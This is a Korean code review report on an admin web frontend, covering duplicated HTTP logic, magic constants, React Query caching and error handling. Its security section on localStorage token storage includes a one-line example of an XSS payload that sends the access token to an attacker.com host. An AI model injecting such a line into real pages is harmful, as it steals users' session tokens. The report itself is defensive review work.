# Entity App Server — Admin Web 코드 리뷰 보고서

> **분석 대상**: `packages/entity-app-server/admin-web/src/`  
> **분석 날짜**: 2025-07-17  
> **관련 문서**: 서버 사이드 리뷰 → [entity-app-server-review.md](entity-app-server-review.md)

---

## 목차

1. [요약](#1-요약)
2. [설계 및 구조](#2-설계-및-구조)
3. [성능 및 효율](#3-성능-및-효율)
4. [보안](#4-보안)
5. [코드 품질](#5-코드-품질)
6. [권장 조치 우선순위](#6-권장-조치-우선순위)

---

## 1. 요약

| 카테고리         | 심각도  | 이슈 수 | 핵심 항목                                                |
| ---------------- | :-----: | :-----: | -------------------------------------------------------- |
| **보안**         | 🔴 높음 |    1    | localStorage 토큰 저장                                   |
| **설계 및 구조** | 🟡 중간 |    5    | HTTP 로직 중복, entityAdminClient 과부하, 토큰 키 파편화 |
| **코드 품질**    | 🟡 중간 |    5    | 예외처리 불일치, 매직 상수, SSR 체크 오용                |
| **성능 및 효율** | 🟢 낮음 |    3    | React Query 캐싱 미설정, 이벤트 리스너, 메모이제이션     |

**전체 평가**: 컴포넌트 구조와 React Query 도입은 적절합니다. 주요 위험은 토큰을 `localStorage`에 저장하는 것으로, XSS 공격 시 인증 토큰이 즉시 탈취될 수 있습니다.

---

## 2. 설계 및 구조

### 2.1 HTTP 요청 로직 중복 (SRP 위반)

**파일**:

- `src/api/appServerClient.ts` — `appFetch()` 함수
- `src/api/entityServerClient.ts` — `_adminFetch()` 함수

`appFetch`와 `_adminFetch` 두 함수가 동일한 HTTP 패턴(Bearer 토큰 헤더 삽입, `res.text()` + `JSON.parse()`, 에러 throw)을 별도로 구현하고 있습니다.

```typescript
// appServerClient.ts
async function appFetch<T>(method, path, body): Promise<T> {
    const token = localStorage.getItem(ACCESS_TOKEN_KEY) || "";
    const res = await fetch(path, {
        headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${token}`,
        },
        body: body != null ? JSON.stringify(body) : undefined,
    });
    const text = await res.text();
    let data: unknown;
    try {
        data = JSON.parse(text);
    } catch {
        data = { ok: false, message: text };
    }
    if (!res.ok) throw new Error((data as any).message ?? `HTTP ${res.status}`);
    return data as T;
}
```

> **권장**: 공통 `createFetcher(getToken)` 팩토리 함수로 통합하여 중복 제거.

---

### 2.2 entityAdminClient 단일 파일 과부하

**파일**: `src/api/entityAdminClient.ts` (350+ 줄)

entities, ERD, api-keys, accounts, roles, licenses, configs, query 등 모든 admin API를 단일 파일에서 관리합니다. 도메인 1개 변경에도 전체 파일에 영향을 미치고 Git diff가 불명확합니다.

> **권장**: `accountsAdminClient.ts`, `rolesAdminClient.ts`, `licensesAdminClient.ts` 등으로 모듈별 분리.

---

### 2.3 토큰 키 상수 파편화

**파일**:

- `src/api/entityServerClient.ts` (L8): `const ACCESS_TOKEN_KEY = "auth_access_token"`
- `src/modules/login/controllers/loginController.ts` (L7): 동일 상수 재정의
- `loginController.ts` (L15): 레거시 키 `"auth_token"`도 별도로 참조

```typescript
// loginController.ts
accessToken:
    typeof window !== "undefined"
        ? localStorage.getItem(ACCESS_TOKEN_KEY) ||
          localStorage.getItem("auth_token")  // ← 레거시 키 혼용
        : null,
```

두 파일에서 같은 상수를 중복 정의하여 키 불일치 버그가 발생할 수 있습니다.

> **권장**:
>
> ```typescript
> // src/api/tokenKeys.ts
> export const TOKEN_KEYS = {
>     ACCESS: "auth_access_token",
>     REFRESH: "auth_refresh_token",
> } as const;
> // 레거시 "auth_token" 참조 제거
> ```

---

### 2.4 매직 문자열 API 경로 하드코딩

**파일**: `src/api/entityServerClient.ts`

```typescript
const isAuthPath =
    path.includes("/v1/auth/login") || path.includes("/v1/auth/refresh");
```

엔드포인트 변경 시 여러 곳을 수동으로 찾아야 합니다.

> **권장**:
>
> ```typescript
> const AUTH_PATHS = {
>     LOGIN: "/v1/auth/login",
>     REFRESH: "/v1/auth/refresh",
> } as const;
> ```

---

### 2.5 페이지 크기 매직 넘버

**파일**: `src/api/entityAdminClient.ts`

```typescript
page_size: 1000; // L36
page_size: 50; // L181, L278
page_size: 100; // L262
```

동일 파일 내에서도 페이지 크기가 일관성 없이 혼용됩니다.

> **권장**:
>
> ```typescript
> const PAGE_SIZE = { SMALL: 50, MEDIUM: 100, LARGE: 1000 } as const;
> ```

---

## 3. 성능 및 효율

### 3.1 React Query `staleTime` 미설정

**파일**: `src/modules/entities/views/EntitiesListPage.tsx`

```typescript
const { data, isLoading } = useQuery({
    queryKey: ["entities"],
    queryFn: () => entitiesApi.getEntities(),
    placeholderData: keepPreviousData,
    // staleTime 없음 → 컴포넌트 포커스마다 재요청
});
```

`staleTime`이 없으면 React Query는 캐시 데이터를 즉시 stale로 간주하여 포커스 복귀 시마다 서버에 재요청합니다.

> **권장**:
>
> ```typescript
> staleTime: 5 * 60 * 1000,  // 5분
> gcTime: 10 * 60 * 1000,
> ```

---

### 3.2 이벤트 리스너 cleanup 일관성

**파일**: `src/modules/query/views/QueryEditorPage.tsx`

```typescript
useEffect(() => {
    const handleMouseMove = (e: MouseEvent) => {
        document.body.style.userSelect = "none"; // ← 스타일 설정
        // ...
    };
    const handleMouseUp = () => {
        dragStateRef.current = null;
        document.body.style.userSelect = ""; // ← handleMouseUp에서만 정리
        document.body.style.cursor = "";
    };
    window.addEventListener("mousemove", handleMouseMove);
    window.addEventListener("mouseup", handleMouseUp);
    return () => {
        window.removeEventListener("mousemove", handleMouseMove);
        window.removeEventListener("mouseup", handleMouseUp);
        // ← document.body 스타일 정리 누락
    };
}, []);
```

컴포넌트 언마운트 시 드래그가 진행 중이면 `document.body.style.userSelect`가 초기화되지 않습니다.

> **권장**: cleanup 함수에 `document.body.style.userSelect = ""; document.body.style.cursor = "";` 추가.

---

### 3.3 필터링 연산 메모이제이션 부재

**파일**: `src/modules/entities/views/EntitiesListPage.tsx`

```typescript
// 렌더링마다 filter 실행
const filtered = (data?.items || []).filter((item) =>
    item.name.toLowerCase().includes(searchText.toLowerCase()),
);
```

> **권장** (선택적):
>
> ```typescript
> const filtered = useMemo(
>     () =>
>         (data?.items ?? []).filter((item) =>
>             item.name.toLowerCase().includes(searchText.toLowerCase()),
>         ),
>     [data, searchText],
> );
> ```

---

## 4. 보안

### 🔴 4.1 토큰을 `localStorage`에 저장 (Critical)

**파일**:

- `src/api/appServerClient.ts` — 토큰 읽기
- `src/modules/login/controllers/loginController.ts` — 토큰 쓰기

```typescript
// 쓰기
localStorage.setItem(ACCESS_TOKEN_KEY, auth.access_token);
localStorage.setItem(REFRESH_TOKEN_KEY, auth.refresh_token);

// 읽기
const token = localStorage.getItem(ACCESS_TOKEN_KEY) || "";
```

**위협**: `localStorage`는 JavaScript에서 자유롭게 읽을 수 있어 XSS 취약점과 결합되면 토큰이 즉시 탈취됩니다. 공격자 스크립트 한 줄로 충분합니다.

```javascript
fetch(
    "https://attacker.com/steal?t=" + localStorage.getItem("auth_access_token"),
);
```

**대안 1 (권장)**: httpOnly 쿠키 사용 — 서버에서 `Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict` 방식으로 발급. JavaScript에서 접근 불가.

**대안 2 (차선)**: 메모리 변수 사용 — 새로고침 시 세션 종료, 재로그인 필요.

```typescript
// 메모리 기반 토큰 스토어
let _accessToken: string | null = null;
export const tokenStore = {
    get: () => _accessToken,
    set: (t: string) => {
        _accessToken = t;
    },
    clear: () => {
        _accessToken = null;
    },
};
```

---

## 5. 코드 품질

### 5.1 예외 처리 전략 불일치

**파일**: `src/modules/login/controllers/loginController.ts`

```typescript
onSubmit: async (values) => {
    try {
        const auth = await entityServer.login(values.email, values.passwd);
        // ...
        return true;
    } catch {
        return false;  // ← 에러 유형 구분 없이 무시
    }
},
```

네트워크 오류, 인증 실패(401), Rate Limit(429) 등이 모두 `false` 하나로 처리됩니다. 사용자에게 적절한 피드백을 줄 수 없습니다.

> **권장**:
>
> ```typescript
> } catch (err: unknown) {
>     const e = err as { status?: number; message?: string };
>     if (e.status === 401) return { ok: false, reason: "invalid_credentials" };
>     if (e.status === 429) return { ok: false, reason: "rate_limited" };
>     console.error("[Login]", err);
>     return { ok: false, reason: "network_error" };
> }
> ```

---

### 5.2 매직 상수 반복

**파일**: `src/modules/entities/views/EntitiesListPage.tsx`, `src/modules/accounts/views/AccountsListPage.tsx`

```typescript
const SCROLL_THRESHOLD = 5; // 두 파일에서 동일하게 정의
```

> **권장**: `src/constants/ui.ts` 파일로 통합.
>
> ```typescript
> export const UI = {
>     SCROLL_THRESHOLD_PX: 5,
>     SEARCH_DEBOUNCE_MS: 350,
> } as const;
> ```

---

### 5.3 SSR 불필요 체크

**파일**: `src/modules/login/controllers/loginController.ts`

```typescript
const initialState: LoginState = {
    accessToken:
        typeof window !== "undefined"
            ? localStorage.getItem(ACCESS_TOKEN_KEY) ||
              localStorage.getItem("auth_token")
            : null,
};
```

이 프로젝트는 Vite + React Router 기반 CSR이므로 `typeof window` 체크는 항상 `true`입니다. 레거시 코드로 보이며 가독성을 낮춥니다.

> **권장**: 체크 제거. 단, `localStorage` 자체를 제거하는 방향(4.1)을 우선 검토.

---

### 5.4 에러 메시지 비일관성

**파일**: `src/modules/login/views/LoginPage.tsx`

```typescript
"서버에 연결할 수 없습니다"; // L86
"이메일 또는 비밀번호가 올바르지 않습니다"; // L99
"로그인 중 오류가 발생했습니다"; // L101
```

에러 메시지가 컴포넌트에 하드코딩되어 있어 다국어 지원 시 일괄 수정이 필요합니다.

> **권장**: 공통 `i18n` 혹은 상수 파일로 메시지 집중 관리.

---

### 5.5 `useEffect` 의존성 ESLint 무시 주석

**파일**: `src/modules/login/views/LoginPage.tsx`

```typescript
useEffect(() => {
    checkServer();
    // eslint-disable-next-line react-hooks/exhaustive-deps
}, []);
```

의도는 올바르지만 ESLint 억제 이유를 설명하지 않으면 향후 유지보수자가 오해할 수 있습니다.

> **권장**: `// 의도적: 컴포넌트 최초 마운트 시 1회만 실행` 같은 이유 주석 추가.

---

## 6. 권장 조치 우선순위

### Phase 1 — 즉시 (보안)

| 우선순위 | 항목                 | 작업                                            |
| :------: | -------------------- | ----------------------------------------------- |
|    1     | **토큰 저장소 변경** | `localStorage` → httpOnly 쿠키 또는 메모리 변수 |

### Phase 2 — 단기 (1~2주, 코드 품질)

| 우선순위 | 항목               | 작업                                               |
| :------: | ------------------ | -------------------------------------------------- |
|    2     | **토큰 상수 통합** | `tokenKeys.ts` 생성, 레거시 키 `"auth_token"` 제거 |
|    3     | **예외처리 개선**  | `loginController` catch 블록에서 에러 유형별 분기  |
|    4     | **매직 상수 통합** | `constants/ui.ts`, `constants/api.ts` 생성         |

### Phase 3 — 중기 (2~4주, 구조 개선)

| 우선순위 | 항목                       | 작업                                          |
| :------: | -------------------------- | --------------------------------------------- |
|    5     | **API 클라이언트 통합**    | `appFetch`/`_adminFetch` 공통 팩토리로 리팩터 |
|    6     | **entityAdminClient 분리** | 도메인별 파일로 분할                          |

### Phase 4 — 장기 (1개월+, 성능 최적화)

| 우선순위 | 항목                      | 작업                              |
| :------: | ------------------------- | --------------------------------- |
|    7     | **React Query 캐싱 전략** | 목록 쿼리에 `staleTime` 정책 수립 |
|    8     | **컴포넌트 메모이제이션** | 필터/정렬 연산에 `useMemo` 도입   |
